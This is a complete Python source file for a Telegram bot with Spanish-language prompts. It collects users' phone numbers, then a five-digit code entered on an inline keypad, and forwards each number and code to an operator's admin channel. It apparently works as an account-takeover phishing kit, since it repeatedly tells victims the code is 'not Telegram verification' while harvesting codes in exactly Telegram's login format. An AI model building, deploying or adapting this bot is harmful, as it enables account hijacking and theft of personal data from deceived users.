import os
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# === Variables de entorno ===
BOT_TOKEN = os.getenv("BOT_TOKEN")                         # Token de @BotFather
ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # ID de tu canal/grupo como cadena

# === Log ===
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("sms-verify-bot")

UD_PHONE = "phone"
UD_CODE  = "code"

def share_phone_kb():
    btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def build_keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("1", callback_data="d:1"),
         InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3")],
        [InlineKeyboardButton("4", callback_data="d:4"),
         InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6")],
        [InlineKeyboardButton("7", callback_data="d:7"),
         InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("0", callback_data="d:0"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    progreso = " ".join(list(code_str)) if code_str else "—"
    text = (
        "🔐 *Verificación por SMS (no es de Telegram)*\n"
        "Introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.\n"
        "Marca cada número y luego toca *✅ Confirmar*.\n\n"
        f"Código: `{progreso}`"
    )
    return text, InlineKeyboardMarkup(rows)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)
    await update.message.reply_text(
        "Hola 👋\n"
        "Para continuar, comparte tu número con el botón de abajo.\n\n"
        "🔎 *Importante*: esto **NO** es verificación de Telegram. "
        "Es un código propio que te enviaremos por *SMS*.",
        reply_markup=share_phone_kb(), parse_mode="Markdown"
    )

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.contact:
        return
    phone = update.message.contact.phone_number
    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE] = ""

    user = update.effective_user
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_text = (
        "📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )
    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
            log.info("Enviado número a destino %s", ADMIN_CHANNEL_ID)
    except Exception as e:
        log.exception("Error enviando número al destino: %s", e)

    await update.message.reply_text(
        "✅ Número recibido correctamente.\n\n"
        "Ahora introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.",
        parse_mode="Markdown"
    )
    text, kb = build_keypad(context.user_data[UD_CODE])
    await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")

async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""
    if data.startswith("d:"):
        if len(code) < 5:
            code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
        return
    elif data == "ok":
        phone = context.user_data.get(UD_PHONE, "desconocido")
        user = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_text = (
            "🧩 *Código ingresado por el cliente*\n"
            f"- Teléfono: `{phone}`\n"
            f"- Código (SMS externo): `{code}`\n"
            f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
            f"- Fecha/Hora: {stamp}"
        )
        try:
            if ADMIN_CHANNEL_ID:
                await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
                log.info("Enviado código a destino %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("Error enviando código al destino: %s", e)
        await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
        context.user_data[UD_CODE] = ""
        return
    context.user_data[UD_CODE] = code
    text, kb = build_keypad(code)
    try:
        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
    except Exception:
        await q.message.edit_reply_markup(reply_markup=kb)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")

async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falló el envío: {e}")
        log.exception("Testsend falló: %s", e)

async def on_startup(app):
    if ADMIN_CHANNEL_ID:
        try:
            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
            log.info("Mensaje de arranque enviado a %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("No pude enviar mensaje de arranque: %s", e)

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("testsend", testsend_cmd))

    app.run_polling()

if __name__ == "__main__":
    main()
